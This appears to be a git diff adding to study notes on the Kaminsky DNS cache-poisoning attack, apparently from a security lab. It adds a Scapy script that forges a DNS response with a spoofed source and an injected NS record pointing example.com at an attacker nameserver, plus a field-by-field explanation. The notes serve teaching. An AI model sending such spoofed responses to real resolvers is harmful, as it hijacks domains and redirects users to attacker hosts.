@@ -77,6 +77,8 @@ Because:
 
 ## 🧪 Attack Steps
 
+![kaminsky attack](image-3.png)
+
 1. Attacker sends query for random subdomain  
    Example:
    random1.example.com  
@@ -142,6 +144,114 @@ Now:
 - login.example.com → attacker  
 
 👉 Entire domain compromised
+
+---
+
+## 💻 Spoofed DNS Response (Kaminsky Attack Template)
+
+```python
+from scapy.all import *
+
+# -------------------------------
+# 🟢 IP + UDP Headers
+# -------------------------------
+ip = IP(dst='10.9.0.53', src='1.2.3.4')
+udp = UDP(dport=33333, sport=53, chksum=0)
+
+# -------------------------------
+# 🟡 Question Section
+# -------------------------------
+Qdsec = DNSQR(qname='aaaaa.example.com')
+
+# -------------------------------
+# 🟡 Answer Section (Fake IP)
+# -------------------------------
+Anssec = DNSRR(
+    rrname='aaaaa.example.com',
+    type='A',
+    rdata='1.1.1.1',
+    ttl=259200
+)
+
+# -------------------------------
+# 🔴 Authority Section (Poisoning)
+# -------------------------------
+NSsec = DNSRR(
+    rrname='example.com',
+    type='NS',
+    rdata='ns.attacker32.com',
+    ttl=259200
+)
+
+# -------------------------------
+# 📦 DNS Packet
+# -------------------------------
+dns = DNS(
+    id=0xAAAA,
+    aa=1,
+    rd=1,
+    qr=1,
+    qdcount=1,
+    qd=Qdsec,
+    ancount=1,
+    an=Anssec,
+    nscount=1,
+    ns=NSsec
+)
+
+# -------------------------------
+# 🚀 Final Packet
+# -------------------------------
+packet = ip / udp / dns
+send(packet)
+```
+
+---
+
+## 🧠 Explanation of Code
+
+- **IP/UDP Headers**
+  - `src='1.2.3.4'` → fake DNS server  
+  - `dst='10.9.0.53'` → target DNS resolver  
+  - `sport=53` → looks like real DNS traffic  
+
+- **Question Section**
+  - Must match the original query (`aaaaa.example.com`)  
+  - Otherwise DNS server rejects the response  
+
+- **Answer Section**
+  - Returns fake IP: `1.1.1.1`  
+  - Redirects victim to attacker-controlled destination  
+
+- **Authority Section (Most Important)**
+  - Injects:
+    `example.com → ns.attacker32.com`  
+  - This changes the trusted nameserver  
+
+- **DNS Header**
+  - `id=0xAAAA` → must match request  
+  - `qr=1` → response  
+  - `aa=1` → authoritative answer  
+
+- **Final Packet**
+  - Combines layers: `IP / UDP / DNS`  
+  - Sent to victim DNS server  
+
+---
+
+## 🔗 Connection to Kaminsky Attack
+
+- Uses random subdomain (`aaaaa.example.com`)  
+- Forces DNS server to query repeatedly  
+- Attacker sends many spoofed responses like this  
+- If one matches → accepted  
+
+💥 Result:
+
+example.com → ns.attacker32.com  
+
+👉 All subdomains now resolve via attacker-controlled DNS  
+👉 Entire domain is hijacked  
 
 ---
 
